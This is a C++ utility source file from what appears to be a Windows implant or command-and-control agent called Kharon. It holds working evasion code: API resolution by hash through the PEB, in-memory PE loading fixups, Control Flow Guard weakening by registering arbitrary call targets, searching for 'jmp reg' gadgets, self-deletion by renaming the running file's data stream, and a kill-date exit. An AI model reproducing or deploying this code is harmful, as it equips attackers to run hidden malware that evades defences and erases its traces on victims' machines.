#include <Kharon.h>

using namespace Root;

auto Useful::ValidGranMem( ULONG GranCount ) -> PVOID {
    MEMORY_BASIC_INFORMATION* MemInfo = (MEMORY_BASIC_INFORMATION*)hAlloc( sizeof( MEMORY_BASIC_INFORMATION ) );

    PVOID PrefBases[] = {
        (PVOID)0x00000000DDDD0000,
        (PVOID)0x0000000010000000,
        (PVOID)0x0000000021000000,
        (PVOID)0x0000000032000000,
        (PVOID)0x0000000043000000,
        (PVOID)0x0000000050000000,
        (PVOID)0x0000000041000000,
        (PVOID)0x0000000042000000,
        (PVOID)0x0000000040000000,
        (PVOID)0x0000000022000000 
    };

    for ( auto Base : PrefBases ) {
        Self->Krnl32.VirtualQuery( Base, MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );

        if ( MEM_FREE == MemInfo->State ) {
            INT32 i;
            for ( i = 0; i < GranCount; i++ ) {
                PVOID CurBase = (PVOID)( (UINT_PTR)( Base ) + ( i * Self->Mm->PageGran ) );

                Self->Krnl32.VirtualQuery( CurBase, MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );
                if ( MEM_FREE != MemInfo->State ) break;
            }
            if ( i == GranCount ) {
                hFree( MemInfo );
                return Base;
            }
        }
    }

    hFree( MemInfo );
    return nullptr;
}

auto DECLFN Useful::NtStatusToError(
    _In_ NTSTATUS NtStatus
) -> ERROR_CODE {
    ULONG WinError = Self->Ntdll.RtlNtStatusToDosError( NtStatus );
    KhSetError( WinError ); return WinError;
}

auto DECLFN Useful::CfgAddrAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) -> VOID {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    IMAGE_NT_HEADERS*    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = (IMAGE_NT_HEADERS*)( U_PTR( ImageBase ) + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = (SIZE_T)( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Self->Ntdll.NtSetInformationVirtualMemory( 
        NtCurrentProcess(),
        VmCfgCallTargetInformation,
        1,
        &MemRange,
        &VmInfo,
        sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }
}

auto DECLFN Useful::CfgPrivAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) -> VOID {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    IMAGE_NT_HEADERS*    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Self->Ntdll.NtSetInformationVirtualMemory( 
        hProcess, 
        VmCfgCallTargetInformation, 
        1, 
        &MemRange, 
        &VmInfo, 
        sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }
}

auto DECLFN Useful::CfgCheck( VOID ) -> BOOL {
    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Self->Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }

    KhDbg( "Control Flow Guard (CFG) Enabled: %s", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

auto DECLFN Useful::FixTls(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    if ( DataDir->Size ) {
        PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( U_PTR( Base ) + DataDir->VirtualAddress );
        PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

        if ( Callback ) {
            for ( INT i = 0; Callback[i] != nullptr; ++i ) {
                Callback[i]( Base, DLL_PROCESS_ATTACH, nullptr );
            }
        }
    }
}

auto DECLFN Useful::FindGadget(
    _In_ UPTR   ModuleBase,
    _In_ UINT16 RegValue
) -> UPTR {
    UPTR   Gadget         = 0;
    UPTR   GadgetList[10] = { 0 };
    ULONG  GadgetCounter  = 0;
    ULONG  RndIndex       = 0;
    BYTE*  SearchBase     = nullptr;
    SIZE_T SearchSize     = 0;
    UINT16 JmpValue       = 0xff;

    SearchBase = B_PTR( ModuleBase + 0x1000 );
    SearchSize = this->SecSize( ModuleBase, Hsh::Str<CHAR>(".text") );

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
            GadgetList[GadgetCounter] = U_PTR( SearchBase + i ); GadgetCounter++;
            if ( GadgetCounter == 10 ) break;
        }
    }

    RndIndex = Rnd32() % GadgetCounter;
    Gadget   = GadgetList[RndIndex];

    return Gadget;
}

auto DECLFN Useful::FixExp(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    if ( DataDir->Size ) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( U_PTR( Base ) + DataDir->VirtualAddress );

        Self->Ntdll.RtlAddFunctionTable( (PRUNTIME_FUNCTION)FncEntry, DataDir->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ), U_PTR( Base ) );
    }
}

auto DECLFN Useful::FixImp(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> BOOL {
    PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( U_PTR( Base ) + DataDir->VirtualAddress );

    for ( ; ImpDesc->Name; ImpDesc++ ) {

		PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( U_PTR( Base ) + ImpDesc->FirstThunk );
		PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( U_PTR( Base ) + ImpDesc->OriginalFirstThunk );

		PCHAR  DllName     = A_PTR( U_PTR( Base ) + ImpDesc->Name );
        PVOID  DllBase     = PTR( LdrLoad::Module( Hsh::Str<CHAR>( DllName ) ) );

        PVOID  FunctionPtr = 0;
        STRING AnsiString  = { 0 };

        if ( !DllBase ) {
            DllBase = (PVOID)Self->Lib->Load( DllName );
        }

		if ( !DllBase ) {
            return FALSE;
		}

		for ( ; OriginThunk->u1.Function; FirstThunk++, OriginThunk++ ) {

			if ( IMAGE_SNAP_BY_ORDINAL( OriginThunk->u1.Ordinal ) ) {

                Self->Ntdll.LdrGetProcedureAddress( 
                    (HMODULE)DllBase, NULL, IMAGE_ORDINAL( OriginThunk->u1.Ordinal ), &FunctionPtr
                );

                FirstThunk->u1.Function = U_PTR( FunctionPtr );
				if ( !FirstThunk->u1.Function ) return FALSE;

			} else {
				PIMAGE_IMPORT_BY_NAME Hint = (PIMAGE_IMPORT_BY_NAME)( U_PTR( Base ) + OriginThunk->u1.AddressOfData );

                {
                    AnsiString.Length        = Str::LengthA( Hint->Name );
                    AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                    AnsiString.Buffer        = Hint->Name;
                }
                
				Self->Ntdll.LdrGetProcedureAddress( 
                    (HMODULE)DllBase, &AnsiString, 0, &FunctionPtr 
                );
                FirstThunk->u1.Function = U_PTR( FunctionPtr );

				if ( !FirstThunk->u1.Function ) return FALSE;
			}
		}
	}
	
	return TRUE;
}

auto DECLFN Useful::SecVa(
    _In_ UPTR LibBase,
    _In_ UPTR SecHash
) -> ULONG {
    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };

    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );

    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;

    SecHdr = IMAGE_FIRST_SECTION( Header );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
            return SecHdr[i].VirtualAddress;
        }
    }

    return 0;
}

auto DECLFN Useful::SecSize(
    _In_ UPTR LibBase,
    _In_ UPTR SecHash
) -> ULONG {
    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };

    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );

    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;

    SecHdr = IMAGE_FIRST_SECTION( Header );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
            return SecHdr[i].SizeOfRawData;
        }
    }

    return 0;
} 

auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
    WCHAR path[MAX_PATH*2];
    if ( ! Self->Krnl32.GetModuleFileNameW( nullptr, path, sizeof( path ) ) ) {
        return EXIT_FAILURE;
    }

    auto FileHandle = Self->Krnl32.CreateFileW( 
        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
        nullptr, OPEN_EXISTING, 0, nullptr 
    );
    if (FileHandle == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    const auto NewStream  = L":redxvz";
    const auto StreamSize = Str::LengthW( NewStream ) * sizeof(WCHAR);
    const auto RenameSize = sizeof(FILE_RENAME_INFO) + StreamSize;
    const auto RenamePtr  = (PFILE_RENAME_INFO)hAlloc( RenameSize ); 
    if ( !RenamePtr ) { return FALSE; }

    RenamePtr->FileNameLength = StreamSize;
    Mem::Copy( RenamePtr->FileName, (PVOID)NewStream, StreamSize );
    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, FileRenameInfo, RenamePtr, RenameSize) ) {
        return FALSE;
    }

    Self->Ntdll.NtClose(FileHandle);

    FileHandle = Self->Krnl32.CreateFileW(
        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE, 
        nullptr, OPEN_EXISTING, 0, nullptr
    );

    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
        return FALSE;
    }

    KhDbg("[+] Self file deletion succefully\n");

    Self->Ntdll.NtClose(FileHandle);
    if ( RenamePtr ) hFree( RenamePtr );

    return TRUE;
}

auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
    SYSTEMTIME SystemTime  = { 0 };
    BOOL       SelfDeleted = FALSE;

    if ( Self->Session.KillDate.Enabled ) {
        Self->Krnl32.GetSystemTime( &SystemTime );

        KhDbg( 
            "the current system date is %d-%d-%d | format year-month-day",
            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay
        );
        KhDbg(
            "kill date is set to %d-%d-%d | format year-month-day",
            Self->Session.KillDate.Year, Self->Session.KillDate.Month, Self->Session.KillDate.Day
        );

        if (
            SystemTime.wDay   == Self->Session.KillDate.Day   &&
            SystemTime.wMonth == Self->Session.KillDate.Month &&
            SystemTime.wYear  == Self->Session.KillDate.Year
        ) {
            KhDbg( "match kill date with current system date" );
            KhDbg( "self-deletion enabled: %s", Self->Session.KillDate.SelfDelete ? "true":"false" );
            KhDbg( "exit choosed is: %s", Self->Session.KillDate.ExitProc ? "process":"thread" );
            KhDbg( "starting self deletion and stop the process" );

            SelfDeleted = Self->Usf->SelfDelete();

            KhDbg( "self-deleted: %s", SelfDeleted ? "true":"false" );
            KhDbg( "exiting the %s with EXIT_SUCCESS code", Self->Session.KillDate.ExitProc ? "process":"thread" );

            if ( Self->Session.KillDate.ExitProc ) {
                Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
            } else {
                Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
            }
        }
    }
}

auto DECLFN Useful::FixRel(
    _In_ PVOID Base,
    _In_ UPTR  Delta,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( U_PTR( Base ) + DataDir->VirtualAddress );
    PIMAGE_RELOC           RelocInf  = { 0 };
    ULONG_PTR              RelocPtr  = NULL;

    while ( BaseReloc->VirtualAddress ) {
        
        RelocInf = (PIMAGE_RELOC)( BaseReloc + 1 ); 
        RelocPtr = ( U_PTR( Base ) + BaseReloc->VirtualAddress );

        while ( B_PTR( RelocInf ) != B_PTR( BaseReloc ) + BaseReloc->SizeOfBlock ) {
            switch ( RelocInf->Type ) {
            case IMAGE_REL_TYPE:
                DEF64( RelocPtr + RelocInf->Offset ) += (ULONG_PTR)( Delta ); break;
            case IMAGE_REL_BASED_HIGHLOW:
                DEF32( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
            case IMAGE_REL_BASED_HIGH:
                DEF16( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
            case IMAGE_REL_BASED_LOW:
                DEF16( RelocPtr + RelocInf->Offset ) += LOWORD( Delta ); break;
            default:
                break;
            }

            RelocInf++;
        }

        BaseReloc = (PIMAGE_BASE_RELOCATION)RelocInf;
    };

    return;
}

auto DECLFN LdrLoad::Module(
    _In_ const ULONG LibHash
) -> UPTR {
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        if ( !LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }

        if ( Hsh::Str<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
 
     return 0;
}
 
auto DECLFN LdrLoad::_Api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR {
    auto FuncPtr    = UPTR { 0 };
    auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
    auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
    auto ExpDir     = PIMAGE_EXPORT_DIRECTORY { nullptr };
    auto ExpNames   = PDWORD { nullptr };
    auto ExpAddress = PDWORD { nullptr };
    auto ExpOrds    = PWORD { nullptr };
    auto SymbName   = PSTR { nullptr };

    DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
        return 0;
    }

    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
    if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
        return 0;
    }

    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
    ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
        SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );

        if ( Hsh::Str( SymbName ) != SymbHash ) {
            continue;
        }

        FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];

        break;
    }

    return FuncPtr;
}

auto DECLFN Mem::Copy(
    _In_ PVOID Dst,
    _In_ PVOID Src,
    _In_ ULONG Size
) -> PVOID {
    BYTE* D = (BYTE*)Dst;
	BYTE* S = (BYTE*)Src;

	while (Size--)
		*D++ = *S++;
	return Dst;
}

auto DECLFN Mem::Set(
    _In_ UPTR Addr,
    _In_ UPTR Val,
    _In_ UPTR Size
) -> void {
    ULONG* Dest = (ULONG*)Addr;
	SIZE_T Count = Size / sizeof(ULONG);

	while ( Count > 0 ) {
		*Dest = Val; Dest++; Count--;
	}

	return;
}

EXTERN_C void* DECLFN memset(void* ptr, int value, size_t num) {
    Mem::Set((UPTR)ptr, value, num);
    return ptr;
}

EXTERN_C void* DECLFN memcpy(void *__restrict__ _Dst, const void *__restrict__ _Src, size_t _Size) {
    return Mem::Copy( _Dst, (PVOID)_Src, _Size );
}

auto DECLFN Mem::Zero(
    _In_ UPTR Addr,
    _In_ UPTR Size
) -> void {
    Mem::Set( Addr, 0, Size );
}

auto DECLFN Str::WCharToChar( 
    PCHAR  Dest, 
    PWCHAR Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while (--Length > 0) {
        if (!(*Dest++ = static_cast<CHAR>(*Src++))) {
            return MaxAllowed - Length - 1;
        }
    }
    return MaxAllowed - Length;
}

auto DECLFN Str::CharToWChar( 
    PWCHAR Dest, 
    PCHAR  Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while ( --Length > 0 ) {
        if ( !( *Dest++ = static_cast<WCHAR>( *Src++ ) ) ) {
            return MaxAllowed - Length - 1;
        }
    }
    return MaxAllowed - Length;
}

auto DECLFN Str::LengthA( 
    LPCSTR String 
) -> SIZE_T {
    LPCSTR End = String;
    while (*End) ++End;
    return End - String;
}

auto DECLFN Str::LengthW( 
    LPCWSTR String 
) -> SIZE_T {
    if (!String) {  
        return 0;
    }

    LPCWSTR End = String;
    while (*End) {
        ++End;
    }
    return static_cast<SIZE_T>(End - String);
}

auto DECLFN Str::CompareWCountL(
    const wchar_t* str1,
    const wchar_t* str2,
    size_t count
) -> int {
    if (count == 0) return 0;
    if (!str1 || !str2) return (!str1 && !str2) ? 0 : (!str1 ? -1 : 1);

    while (count-- > 0) {
        int diff = Str::ToLowerWchar(*str1) - Str::ToLowerWchar(*str2);
        if (diff != 0) return diff;
        if (*str1 == L'\0') break;
        str1++;
        str2++;
    }
    return 0;
}

auto DECLFN Str::CompareCountW( 
    PCWSTR Str1, 
    PCWSTR Str2, 
    INT16  Count 
) -> INT {  
    if (!Str1 || !Str2) {
        return Str1 ? 1 : (Str2 ? -1 : 0);
    }

    for (INT16 Idx = 0; Idx < Count; ++Idx) {
        if (Str1[Idx] != Str2[Idx]) {
            return static_cast<INT16>(Str1[Idx]) - static_cast<INT16>(Str2[Idx]);
        }
        if (Str1[Idx] == L'\0') {  
            return 0;
        }
    }

    return 0;  
}

auto DECLFN Str::CompareCountA( 
    PCSTR Str1, 
    PCSTR Str2, 
    INT16 Count 
) -> INT {
    INT16 Idx = 0;

    while (*Str1 && (*Str1 == *Str2) && Idx < Count) {
        ++Str1;
        ++Str2;

        Idx++;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::CompareA( 
    LPCSTR Str1, 
    LPCSTR Str2 
) -> INT {
    while (*Str1 && (*Str1 == *Str2)) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::StartsWith(
    BYTE* Str, 
    BYTE* Prefix
) -> BOOL {
    if (!Str || !Prefix) {
        return FALSE;
    }

    while (*Prefix) {
        if (*Str != *Prefix) {
            return FALSE; 
        }
        ++Str;
        ++Prefix;
    }
    return TRUE;
}

auto DECLFN Str::CompareW( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> INT {
    while ( *Str1 && ( *Str1 == *Str2 ) ) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>( *Str1 ) - static_cast<INT>( *Str2 );
}

auto DECLFN Str::ToUpperChar(
    char* str
) -> VOID {
    while (*str) {
        if (*str >= 'a' && *str <= 'z') {
            *str = *str - ('a' - 'A');
        }
        str++;
    }
}

auto DECLFN Str::ToLowerChar( 
    PCHAR Str
) -> VOID {
    while (*Str) {
        if (*Str >= 'A' && *Str <= 'Z') {
            *Str += ('a' - 'A');
        }
        ++Str;
    }
}

auto DECLFN Str::ToLowerWchar( 
    WCHAR Ch 
) -> WCHAR {
    return (Ch >= L'A' && Ch <= L'Z') ? Ch + (L'a' - L'A') : Ch;
}

auto DECLFN Str::CopyA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    PCHAR p = Dest;
    while ((*p++ = *Src++));
    return Dest;
}

auto DECLFN Str::CopyW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    PWCHAR p = Dest;
    while ( ( *p++ = *Src++ ) );
    return Dest;
}

auto DECLFN Str::ConcatA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    return Str::CopyA( Dest + Str::LengthA(Dest), Src );
}

auto DECLFN Str::ConcatW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    return Str::CopyW( Dest + Str::LengthW(Dest), Src );
}

auto DECLFN Str::IsEqual( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> BOOL {
    WCHAR TempStr1[MAX_PATH], TempStr2[MAX_PATH];
    SIZE_T Length1 = Str::LengthW( Str1 );
    SIZE_T Length2 = Str::LengthW( Str2 );

    if ( Length1 >= MAX_PATH || Length2 >= MAX_PATH ) return FALSE;

    for (SIZE_T i = 0; i < Length1; ++i) {
        TempStr1[i] = Str::ToLowerWchar( Str1[i] );
    }
    TempStr1[Length1] = L'\0';

    for (SIZE_T j = 0; j < Length2; ++j) {
        TempStr2[j] = Str::ToLowerWchar( Str2[j] );
    }
    TempStr2[Length2] = L'\0';

    return Str::CompareW( TempStr1, TempStr2 ) == 0;
}

auto DECLFN Str::InitUnicode( 
    PUNICODE_STRING UnicodeString, 
    PWSTR           Buffer 
) -> VOID {
    if (Buffer) {
        SIZE_T Length = Str::LengthW(Buffer) * sizeof(WCHAR);
        if (Length > 0xFFFC) Length = 0xFFFC;

        UnicodeString->Buffer = const_cast<PWSTR>(Buffer);
        UnicodeString->Length = static_cast<USHORT>(Length);
        UnicodeString->MaximumLength = static_cast<USHORT>(Length + sizeof(WCHAR));
    } else {
        UnicodeString->Buffer = nullptr;
        UnicodeString->Length = 0;
        UnicodeString->MaximumLength = 0;
    }
}

// auto DECLFN Str::GenRnd( 
//     ULONG StringSize
// ) -> PCHAR {
//     CHAR  Words[]    = "abcdefghijklmnopqrstuvwxyz0123456789";
//     ULONG WordsLen   = Str::LengthA( Words );
//     ULONG Count      = 0;
//     PSTR  RndString  = A_PTR( Heap().Alloc( StringSize ) );

//     for ( INT i = 0; i < StringSize; i++ ) {
//         ULONG Count  = ( Random32() % WordsLen );
//         Mem::Copy( RndString, &Words[Count] , sizeof( Words[Count] ) + i );
//     }

//     return RndString;
// }

auto DECLFN Rnd32(
    VOID
) -> ULONG {
    UINT32 Seed = 0;

    _rdrand32_step( &Seed );
    
    return Seed;
}

VOID DECLFN volatile ___chkstk_ms(
    VOID
) { __asm__( "nop" ); }